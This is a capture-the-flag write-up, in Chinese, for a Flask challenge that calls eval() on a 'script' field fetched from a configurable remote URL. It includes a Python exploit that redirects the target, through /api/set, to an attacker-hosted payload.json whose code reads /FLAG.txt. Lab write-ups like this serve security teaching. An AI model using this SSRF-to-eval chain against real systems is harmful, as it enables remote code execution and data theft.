# 题目描述
The developer was trying to make everything so secure that he ended up making it insecure.  Figure out all the relationshipt, and then how to take advantage of them. The goal is to execute code on the flask app container and read /FLAG.txt

# 知识点
Command Injection

# 思路
app.py 对第三方 URL 返回的 JSON 的 "script" 字段直接用 eval 执行，导致RCE。利用方法就是在自己可控主机上放置 payload.json ,把该 URL 通过 /api/set?url=... 写入目标，然后访问 /app 触发 eval

# 解题步骤

可以set url

![image-x12093406458](./assets/image-x12093406458.png)

还有一个app

![image-x12093735352](./assets/image-x12093735352.png)

app 容器会访问 nginx 上的可配置“api URL”（/api/get 返回一个 URL），然后去请求该 URL，取回 JSON 后对 JSON["script"] 用 Python 的 eval 执行。

利用 nginx 暴露的 /api/set?url=... 把这个 URL 指向自己可控的服务器，返回含有恶意脚本的 JSON，比如 open('/FLAG.txt').read()，app 在 eval 后会把文件内容作为 eval_result 渲染出来，从而泄露 /FLAG.txt。

# EXP

```python
import requests, sys, time

TARGET = "http://ip32844/"
ATTACKER_HOST = "" #VPS IP
PAYLOAD_URL = f"http://{ATTACKER_HOST}:2333/payload.json"

requests.get(f"{TARGET}/api/set", params={"url": PAYLOAD_URL}, timeout=5)

r = requests.get(f"{TARGET}/app", timeout=10)
if r.status_code==200:
    print(r.text)
else:
    print("请求失败:", r.status_code)
```

payload.json内容为

```json
{"script":"open('/FLAG.txt').read()"}
```

